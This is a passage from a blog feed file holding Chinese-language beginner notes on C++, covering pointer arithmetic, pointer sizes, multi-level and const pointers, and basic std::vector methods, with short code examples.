class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;b &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见效果：<img src="/2022/05/02/pointer/005.png" class=""></p><blockquote><p>变量b的地址一开始时FF574，指针p在初始化的时候地址是变量a的地址，我们在后面修改了指针p的地址，使其得到变量b的地址。效果在第二次打印的时候可以看出。<br>可能有的人会有点懵，这里需要自己先理一下*和&amp;的角度。</p></blockquote><p>简单梳理完后，我们知道&amp;也是属于单目运算符，那么指针是否也可以实现一些加减操作呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line">p = &amp;a;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">*p--;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们直接对指针–操作：<img src="/2022/05/02/pointer/006.png" class=""><br>编译器其实也给出了警告：<img src="/2022/05/02/pointer/007.png" class=""></p><ol><li>这里能看出来p和a地址之间差了4？</li><li>a的值能够正常输出，指针却不能显示正确的值了？</li></ol><p>首先为什么会差了4，这跟类型占用空间有关。<br>为什么不能输出a的值了，原因在于，少了4之后的内存地址，我们没有给它赋值过，程序也不知道那一段数据有什么，万一前面的空间占了8字节，而我们只截取了一部分，那么数据也就是不完整的了。</p><blockquote><p>所以指针要慎用，你要明确的知道你这个指针的操作是有什么目的。</p></blockquote><p>至于为什么<code>p--</code>是修改地址而不是对a进行操作，这也跟运算符的优先级有关，我们将指针p用括号括起来看看效果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line">p = &amp;a;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">(*p)--;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，<code>(*p)--</code>之后，a的值同样发生了改变：<img src="/2022/05/02/pointer/008.png" class=""><br>这也意味着<code>(*p)-- == a--</code>，能减自然也能加，能–在后，也能–放在前。</p><hr><h2 id="指针数组"><a href="#指针数组" class="headerlink" title="指针数组"></a>指针数组</h2><h3 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h3><p>跟数组一样，在变量名前加个*，例如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *pCh[<span class="number">10</span>];   <span class="comment">//代表声明了10个int类型的指针</span></span><br></pre></td></tr></table></figure><p>在此之前，我们先验证一下正常的数组的内存地址是否是连续的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ch[<span class="number">10</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">    std::cout &lt;&lt; &amp;ch[i] &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到：<img src="/2022/05/02/pointer/009.png" class=""></p><blockquote><p>16进制，A&#x3D;10,B&#x3D;11。。。F&#x3D;15</p></blockquote><p>这个一维数组的内存地址也让我们很好理解了，上述对单个指针–操作的时候为什么地址少了4，原因离不开变量的类型。<br>二维数组以至于多维数组的地址也都是连续的。</p><hr><h2 id="指针大小"><a href="#指针大小" class="headerlink" title="指针大小"></a>指针大小</h2><p>利用<code>sizeof()</code>同样可以测出指针的大小</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p&#123;&#125;;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">sizeof</span>(p) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是：<img src="/2022/05/02/pointer/010.png" class=""><br>看到是8，很多人会想到可能跟变量类型有关。那如果是char类型的指针呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p&#123;&#125;;</span><br><span class="line">    <span class="type">char</span> *cp&#123;&#125;;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">sizeof</span>(p) &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">sizeof</span>(cp) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是：<img src="/2022/05/02/pointer/012.png" class=""><br>两者都是8，说明了一个问题，指针它声明的时候他自己其实也是个变量，是变量就需要占用内存空间。</p><blockquote><p>tips: 默认vs2022 是使用x64编译，你可以尝试一下x86编译后。</p></blockquote><img src="/2022/05/02/pointer/011.png" class=""><p>可以看到在x86下编译执行后，指针的占用空间变成4字节了，这其实跟操作系统位数有关：</p><hr><h3 id="操作系统位数的影响"><a href="#操作系统位数的影响" class="headerlink" title="操作系统位数的影响"></a>操作系统位数的影响</h3><p>32位的操作系统下，寻址范围是32位，也就是32bit，等于4byte。<br>64位的操作系统下，寻址能力是64位，也就是64bit，等于8byte。</p><blockquote><p>这里先不扯寄存器和地址总线的问题，一旦深究，会发现和现实情况有所出入，目前先代入理解指针为什么一会占用4字节一会占用8字节。</p></blockquote><p>我们在x86下打印指针p的地址看一看：<img src="/2022/05/02/pointer/013.png" class=""></p><p>16进制两位等于一字节，这里有8位 &#x2F; 2 &#x3D; 4，也就是4字节。<br>转换成x64下再印呢？<img src="/2022/05/02/pointer/014.png" class=""><br>这里一共16位 &#x2F; 2 &#x3D; 8，也就是8字节。</p><blockquote><p>为什么不打印char *指针的地址呢，首先我们要明白一个事，指针内存占用是4字节或者8字节了，但是char本身只占用一个字节的空间。那么将char类型的地址赋给char *就会产生一个问题，char*可以表示出char，但是你直接打印char *的时候，四字节只有一个字节是有明确含义的地址，就会导致乱码。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">char</span> c = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="type">int</span> *p = &amp;a;</span><br><span class="line"><span class="type">char</span> *cp = &amp;c;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">sizeof</span>(p) &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">sizeof</span>(cp) &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; cp &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打印后可以很清楚的看到：<img src="/2022/05/02/pointer/015.png" class=""><br>A是打印了，但是后面都是乱码。</p><hr><p>然后回到上文：我们继续探讨指针</p><p>想必几个简单的案例，就能看出指针的强大之处。可是越强大就越不好掌握。</p><p>再往下看</p><img src="/2022/05/02/pointer/016.png" class=""><p>首先，不同类型隐式转换肯定不成功，那么我们就用强制转换</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> ui = <span class="number">999</span>;</span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span>*) &amp;ui;</span><br></pre></td></tr></table></figure><img src="/2022/05/02/pointer/017.png" class=""><p>值都是正常的，我们说unsigned是无符号的意思，也就是说ui不能表示为负数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*p = <span class="number">-1</span>;</span><br></pre></td></tr></table></figure><p>输出ui的时候发现，ui变得很大，这是因为变量都有固定的大小，四字节的时候，2^32次-1正好就是这个数。</p><blockquote><p>如果使用更大类型或者更小类型去强转，则会发生不可预料的情况，因为ui默认只占了四字节，多了或少了系统读取的内存不一样了，内容也会各不相同。</p></blockquote><img src="/2022/05/02/pointer/018.png" class=""><p>但是我们再输出*p:<img src="/2022/05/02/pointer/019.png" class=""><br>发现正常输出-1了，这是因为指针就是int类型，而ui却是unsigned。可想而知，计算机太单纯了，他单纯的表示二进制，符号位也是我们强加的，因此指针的类型不但在于它占用多少空间，更是为了让计算机怎么去处理这个指针的内容。</p><hr><h2 id="练习一下"><a href="#练习一下" class="headerlink" title="练习一下"></a>练习一下</h2><h3 id="1—"><a href="#1—" class="headerlink" title="1—"></a>1—</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[] &#123;<span class="number">10001</span>,<span class="number">20001</span>,<span class="number">30001</span>,<span class="number">40001</span>&#125;;</span><br><span class="line"><span class="type">int</span> *p = &amp;a[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//(*p)++ or *p++的结果</span></span><br></pre></td></tr></table></figure><p>首先*p 目前是a[0]的地址，可以打印出10001。<br>()阔号的优先级更高，所以先在内存中读出10001，然后在进行++操作，故此(*p)++ &#x3D; 10002，但是由于直接打印，++在右边，所以先输出10001，然后在自增。</p><p>而*p++呢，没有修改优先级，相当于地址+1，那么默认在p的地址上+4，为什么加4前面说过了，int类型占用四字节，地址自增，就是每次往后移动四字节【根据类型】。所以这里*p++的结果为20001。但是同理，++在右，先运算在自增。由于之前(*p)++了，所以这里的*p的值默认变成了10002，但是对于地址而言，移动四字节变成了a[1]:20001的地址。</p><blockquote><p>这里不好理解的话，再解释一下，int类型的指针默认占用4字节，x86的情况下，当计算机去读取的时候肯定也是四个字节来读，那么指针+1，他肯定是要按照它本身地址+类型占用空间，通俗的话说这个1就是它自己<br>+1 就使得p的地址移动到了20001的地址，那么从a[0]开始+2，p就会移动到30001的地址</p></blockquote><img src="/2022/05/02/pointer/020.png" class=""><p>当然这个可能看上去不直观，那么修改一下先输出数组所有元素的地址</p><img src="/2022/05/02/pointer/021.png" class=""><p>然后的然后我们就可以开始套娃了：<br>是变量都会有占用空间，都会有内存地址，那么指针变量也不例外</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; &amp;p &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>就可以输出指针的地址了，以上述的题打样：</p><img src="/2022/05/02/pointer/022.png" class=""><p>应该是能清楚看到p的地址比数组成员都要大，当然这是因为数组先声明，在内存中肯定早点申请了空间。</p><h3 id="2—"><a href="#2—" class="headerlink" title="2—"></a>2—</h3><p>回归正题，*p 能操作同类型的地址，那么如何操作*p的地址呢。<br>有意思的衍生出了二级指针</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> **p2;</span><br></pre></td></tr></table></figure><p>需要注意的是：</p><ul><li>二级指针只能指向一级指针的地址，不能指向单纯的变量地址</li><li>不用尝试&amp;&amp;去获取变量的地址，无效套娃</li></ul><img src="/2022/05/02/pointer/023.png" class=""><img src="/2022/05/02/pointer/024.png" class=""><img src="/2022/05/02/pointer/025.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p2 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>输出p的地址和*p2的地址是相同的：<img src="/2022/05/02/pointer/026.png" class=""><br>那么**p2的值就是*p代表的值了：<img src="/2022/05/02/pointer/027.png" class=""></p><blockquote><p>反复提醒：变量存在于局部时，每次运行分配的地址与之前不同。</p></blockquote><p>如果你想要整一个int ***p3和int ****p4，ok都没关系，都可以操作，只是相应的，要注意高级别的指针只能指向低一级的地址。【多维数组与多级指针息息相关】</p><h3 id="3—"><a href="#3—" class="headerlink" title="3—"></a>3—</h3><p>补充一个东西，const 是限定一个变量为常量，即初始化后不可以修改。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> *p = &amp;a;<span class="comment">//肯定会报错，因为二者类型不相同</span></span><br></pre></td></tr></table></figure><p>所以指针也要变成const</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> *p = &amp;a;<span class="comment">//这样才合法</span></span><br></pre></td></tr></table></figure><p>const是限定了一个常量。那么常量指针还能从而修改值吗？<br>答案是不能：<img src="/2022/05/02/pointer/028.png" class=""><br>但是，常量指针可以重新指向别的常量：<img src="/2022/05/02/pointer/029.png" class=""></p><blockquote><p>const int *p 的当const在前的时候即限定了这个指针不能修改地址里面的值，只能换地址<br>随记表面 const能放后面。int *const p<br>脑袋肯定晕乎乎了。。。不过const在前时指针称为常量指针，const在后时称为指针常量</p></blockquote><p>先看指针常量：<br>当const出现在变量名前面的时候，就已经是常量了，说明了这个指针初始化后肯定是不能修改地址了。<br>不过还是能修改初始化时地址的变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> *<span class="type">const</span> p = &amp;a;</span><br><span class="line"></span><br><span class="line">p = &amp;b;<span class="comment">//error：左值是常量不可修改</span></span><br><span class="line">*p = <span class="number">300</span>;<span class="comment">//合法，因为指针常量指向的仍然是一个变量</span></span><br></pre></td></tr></table></figure><p>还没完！！！！！！<br>const前后都放过了，那如果前后都存在呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> *<span class="type">const</span> p = &amp;a;</span><br><span class="line"></span><br><span class="line">p = &amp;b;<span class="comment">//error</span></span><br><span class="line">*p = <span class="number">300</span>;<span class="comment">//error</span></span><br></pre></td></tr></table></figure><p>当出现两个const的时候，称之为指向常量的常量指针，也就说当这个指针初始化后，既不可以修改指向的内存地址，也不可以修改内存地址上的数据。<br>说人话就是这种限定完之后啥都不能改了。</p><hr><h2 id="强制转换"><a href="#强制转换" class="headerlink" title="强制转换"></a>强制转换</h2><p>强制转换用到的地方也不少，在两个类型不相同的变量传递之间，隐式转换不起作用那么就需要我们手动强制转换，指针也不例外。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p = &amp;a;<span class="comment">//error，因为类型不一致</span></span><br></pre></td></tr></table></figure><img src="/2022/05/02/pointer/030.png" class=""><p>将其修改为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span> *) &amp;a;</span><br></pre></td></tr></table></figure><p>然后印证指针p指向的是a的地址：<code>std::cout &lt;&lt; *p &lt;&lt; std::endl;</code></p><img src="/2022/05/02/pointer/031.png" class=""><p>打印出来的也是1000，说明没啥问题。</p><p>如果我们修改指针的值呢，发现也的确可以修改：</p><img src="/2022/05/02/pointer/032.png" class=""><p>但是有个问题了，a是什么，a是一个常量，它的值会改变吗？</p><img src="/2022/05/02/pointer/033.png" class=""><p>打上断点转到反汇编浅看一下：</p><img src="/2022/05/02/pointer/034.png" class=""><ol><li>在初始化a的时候，将[3E8h]转成十进制就是1000 mov到 a的地址上。</li><li>然后将a强转给指针p的时候，编译器先把a的地址存到rax寄存器上</li><li>*p&#x3D;250的时候，又把p的地址 mov到 rax寄存器上，然后将[0FAh]这个十六进制转换成十进制就是250 mov到rax寄存器的地址上。</li><li>然后打印*p的时候，又先将指针p的地址mov到rax上，在将rax的地址mov到rdx上；打印a的时候则是直接将[3E8h] 1000的值 mov到rdx上。</li></ol><blockquote><p>虽然对于汇编知识较为欠缺，但是凭大概看法就是，编译器是修改了*p的值，但是他也记住了a本身的值一样，就是类似于宏定义，这样不论什么时候调用a，他都直接以3E8h的值进行传递。</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>指针还是很神奇的东西。。以后不少地方还会用到，得好好摸索摸索。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>std::vector</title>
      <link href="/2022/04/30/std-vector/"/>
      <url>/2022/04/30/std-vector/</url>
      
        <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>vector头文件</li><li>IDE：vs 2022</li></ul><span id="more"></span><hr><h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><ul><li>std::vector&lt;数据类型&gt; 变量名;</li><li>std::vector<int> v;                    &#x2F;&#x2F;基本定义</li><li>std::vector<int> v1{ 1,2,3,4,5 };    &#x2F;&#x2F;直接初始化</li><li>std::vector<int> v2(5);            &#x2F;&#x2F;成员容量为五个</li><li>std::vector<int> v3(5, 100);    &#x2F;&#x2F;五个成员均为100</li></ul><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>容器方面，对成员的访问方式都可以通过[],即：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; v&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    std::cout &lt;&lt; v[<span class="number">2</span>] &lt;&lt; std::endl;     <span class="comment">//合法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="size"><a href="#size" class="headerlink" title="size()"></a>size()</h2><p>这个不多说，跟之前的array一样，返回vector的成员个数。</p><hr><h2 id="push-back"><a href="#push-back" class="headerlink" title="push_back()"></a>push_back()</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">v3</span><span class="params">(<span class="number">5</span>, <span class="number">100</span>)</span></span>;<span class="comment">//五个成员均为100</span></span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; v3.<span class="built_in">size</span>() &lt;&lt; std::endl;</span><br><span class="line">v3.<span class="built_in">push_back</span>(<span class="number">200</span>);</span><br><span class="line">std::cout &lt;&lt; v3.<span class="built_in">size</span>() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：</p><img src="/2022/04/30/std-vector/000.png" class=""><blockquote><p>也就是说v3扩容了，那么再来看看他所有成员的值。</p></blockquote><p>利用c++提供的for循环：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : v3)&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到结果：<img src="/2022/04/30/std-vector/001.png" class=""></p><hr><h2 id="assign"><a href="#assign" class="headerlink" title="assign()"></a>assign()</h2><p>在初始化的时候我们提到过：<code>std::vector&lt;int&gt; v3(5, 100);    </code>，即定义一个拥有五个成员且值都为100的vector。<br>而assign()，他会覆盖掉以前的值，也就是说即便你初始化过，后期添加或删除过，都可以用assign覆盖。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">v3</span><span class="params">(<span class="number">5</span>, <span class="number">100</span>)</span></span>;<span class="comment">//五个成员均为100</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : v3)&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v3.<span class="built_in">assign</span>(<span class="number">10</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : v3)&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到结果：<img src="/2022/04/30/std-vector/002.png" class=""></p><hr><h2 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h2><p>有覆盖的方法，那么就会想到清空，clear就能够实现清空一个vector</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">v3</span><span class="params">(<span class="number">5</span>, <span class="number">100</span>)</span></span>;<span class="comment">//五个成员均为100</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : v3)&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v3.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : v3)&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现清空之后没有值了</p><img src="/2022/04/30/std-vector/003.png" class=""><hr><h2 id="empty"><a href="#empty" class="headerlink" title="empty()"></a>empty()</h2><blockquote><p>能清空就需要能判断是否为空</p></blockquote><p>empty的返回值是布尔类型，vector为空返回true，不为空返回false</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">v3</span><span class="params">(<span class="number">5</span>, <span class="number">100</span>)</span></span>;<span class="comment">//五个成员均为100</span></span><br><span class="line">std::cout &lt;&lt; v3.<span class="built_in">empty</span>() &lt;&lt; std::endl;</span><br><span class="line">v3.<span class="built_in">clear</span>();</span><br><span class="line">std::cout &lt;&lt; v3.<span class="built_in">empty</span>() &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>能够清楚的看到情况前后v3的状态：</p><img src="/2022/04/30/std-vector/004.png" class=""><blockquote><p>0和1是正常的，规定里0代表false，1代表true</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>STL记得还有挺多的，以前看过黑马的c++，用的少了现在从头理理吧。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>std::array</title>
      <link href="/2022/04/30/std-array/"/>
      <url>/2022/04/30/std-array/</url>
      
